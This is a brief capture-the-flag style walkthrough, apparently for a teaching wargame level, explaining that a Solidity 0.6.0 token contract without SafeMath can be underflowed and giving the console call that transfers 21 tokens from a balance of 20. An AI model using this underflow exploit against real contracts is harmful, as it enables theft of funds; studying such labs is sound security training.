## Solution Overview
1. Looking at the code, it's using solidity 0.6.0 and SafeMath is not used, so it's susceptible to integer overflow and underflow issues.
2. Since we have a balance of 20, we'd just need to do a transfer of 21 to trigger an underflow
```
await contract.transfer(contract.address, 21)

// code to check player balance
await contract.balanceOf(player).then(x => x.toString())
```